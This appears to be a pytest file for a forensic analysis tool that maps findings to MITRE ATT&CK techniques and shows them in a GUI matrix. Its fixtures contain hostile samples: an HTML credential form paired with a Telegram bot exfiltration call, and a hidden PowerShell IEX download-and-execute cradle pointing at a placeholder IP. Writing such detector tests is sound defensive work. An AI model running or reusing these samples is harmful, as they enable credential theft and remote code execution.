"""MITRE-ATT&CK-Zuordnung (engines/attack.py) und die Matrix in der Analyse-Ansicht."""
import os

import pytest

from engines import run_forensic
from engines.attack import CODE_MAP, TECHNIQUES, TACTIC_NAMES, map_findings, map_result, technique_url


def test_mapping_is_consistent():
    for code, tids in CODE_MAP.items():
        assert tids, code
        for tid in tids:
            assert tid in TECHNIQUES, (code, tid)
            assert all(t in TACTIC_NAMES for t in TECHNIQUES[tid][1])
    assert technique_url("T1059.001") == "https://attack.mitre.org/techniques/T1059/001/"


def test_severity_and_tactic_counts():
    m = map_findings([
        {"code": "script_downloader", "severity": "WARN"},
        {"code": "script_amsi_bypass", "severity": "CRIT"},
        {"code": "script_downloader", "severity": "CRIT"},
        {"code": "macro_present", "severity": "INFO"},
        {"code": "sha256_irrelevant", "severity": "CRIT"},
    ])
    by_id = {t["id"]: t for t in m["techniques"]}
    assert set(by_id) == {"T1105", "T1562.001", "T1059.005"}
    assert by_id["T1105"]["severity"] == "CRIT" and by_id["T1105"]["codes"] == ["script_downloader"]
    # INFO zählt nicht zur Heatmap
    assert m["tactics"]["Execution"] == 0
    assert m["tactics"]["Command and Control"] == 1 and m["tactics"]["Defense Evasion"] == 1
    assert m["techniques"][-1]["id"] == "T1059.005"            # Kontext zuletzt


def test_pipeline_attaches_attack(tmp_path):
    p = tmp_path / "invoice.html"
    p.write_text('<form action="https://x.invalid/p"><input type=password></form>'
                 '<script>fetch("https://api.telegram.org/bot1/sendMessage")</script>')
    res = run_forensic(str(p))
    ids = {t["id"] for t in res["attack"]["techniques"]}
    assert {"T1056.003", "T1567"} <= ids
    # Ältere gespeicherte Ergebnisse ohne 'attack' werden nachträglich zugeordnet
    old = dict(res)
    old.pop("attack")
    assert {t["id"] for t in map_result(old)["techniques"]} == ids


def test_analysis_view_shows_matrix(tmp_path):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    from gui.analysis_view import AnalysisView
    p = tmp_path / "x.ps1"
    p.write_text("powershell -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')\"")
    view = AnalysisView()
    view.load_result(run_forensic(str(p)))
    assert "TECHNIQUE" in view.attack.lbl_summary.text()
    assert "ATT&CK   : " in view.txt_overview.toPlainText()
    assert view.attack._cols.count() == len(TACTIC_NAMES)
    view.reset()
    assert view.attack.lbl_summary.text().strip().startswith("—")
